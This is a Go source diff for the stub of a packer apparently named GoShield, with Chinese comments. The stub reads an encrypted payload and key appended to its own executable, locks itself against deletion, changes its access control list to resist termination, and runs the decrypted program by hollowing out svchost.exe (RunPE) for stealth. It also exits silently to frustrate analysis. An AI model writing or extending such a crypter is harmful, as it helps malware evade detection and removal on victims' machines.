@@ -2,6 +2,8 @@
 package main
 
 import (
+	"encoding/binary"
+	"io"
 	"os"
 
 	"github.com/Limkon/GoShield/internal/crypto"
@@ -9,32 +11,76 @@ import (
 	"github.com/Limkon/GoShield/internal/protect"
 )
 
-// 直接声明全局变量即可，不要用 extern
-// Builder 动态生成的 payload.go 也在 package main 下，它们会自动链接
-var EncryptionKey []byte
-var EncryptedPayload []byte
-
 func main() {
-	// 1. 启动最强防御：独占锁定自身防删，修改 DACL 防杀
-	protect.EnableProtection()
-
-	// 2. 解密真实程序的 Payload
-	decryptedPayload, err := crypto.Decrypt(EncryptedPayload, EncryptionKey)
+	// 1. 先从自身读取附加数据 (为了避免与后续的独占防删锁冲突，先读取数据到内存)
+	exePath, err := os.Executable()
 	if err != nil {
-		// 密文损坏或被篡改，静默退出，防分析
 		os.Exit(1)
 	}
 
-	// 3. 执行内存加载 (RunPE)
-	// 这里选择系统自带的合法程序 svchost.exe 作为空壳宿主，隐蔽性极强
-	targetHost := "C:\\Windows\\System32\\svchost.exe"
+	file, err := os.Open(exePath)
+	if err != nil {
+		os.Exit(1)
+	}
+
+	stat, err := file.Stat()
+	if err != nil {
+		file.Close()
+		os.Exit(1)
+	}
+	fileSize := stat.Size()
+
+	// 尾部结构大小: Key(32) + PayloadSize(8) + Magic(8) = 48 字节
+	footerSize := int64(48)
+	if fileSize < footerSize {
+		file.Close()
+		os.Exit(1) // 无附加数据
+	}
+
+	// 定位并读取尾部 48 字节
+	file.Seek(-footerSize, io.SeekEnd)
+	footer := make([]byte, footerSize)
+	io.ReadFull(file, footer)
+
+	// 校验特征码
+	if string(footer[40:48]) != "GOSHIELD" {
+		file.Close()
+		os.Exit(1) // 非法篡改或未加壳
+	}
+
+	// 解析 Payload 大小和密钥
+	key := footer[0:32]
+	payloadSize := binary.LittleEndian.Uint64(footer[32:40])
+
+	if fileSize < footerSize+int64(payloadSize) {
+		file.Close()
+		os.Exit(1) // 文件损坏
+	}
+
+	// 定位并读取密文 Payload
+	file.Seek(-(footerSize + int64(payloadSize)), io.SeekEnd)
+	encryptedPayload := make([]byte, payloadSize)
+	io.ReadFull(file, encryptedPayload)
 	
+	// 读取完毕，立刻关闭文件句柄，释放系统默认锁
+	file.Close()
+
+	// 2. 启动最强防御：独占锁定自身防删 (ShareMode=0)，修改 DACL 防杀
+	protect.EnableProtection()
+
+	// 3. 解密真实程序的 Payload
+	decryptedPayload, err := crypto.Decrypt(encryptedPayload, key)
+	if err != nil {
+		os.Exit(1) // 密文损坏或被篡改，防分析
+	}
+
+	// 4. 执行内存加载 (RunPE)
+	targetHost := "C:\\Windows\\System32\\svchost.exe"
 	err = loader.Execute(targetHost, decryptedPayload)
 	if err != nil {
 		os.Exit(1)
 	}
 
-	// 4. 保持 Stub 主线程存活，维持防删防杀状态
-	// 因为宿主傀儡进程 (svchost) 是异步运行的，Stub 必须保持挂起，否则防御失效
+	// 5. 保持 Stub 主线程存活，维持防删防杀状态
 	select {}
 }
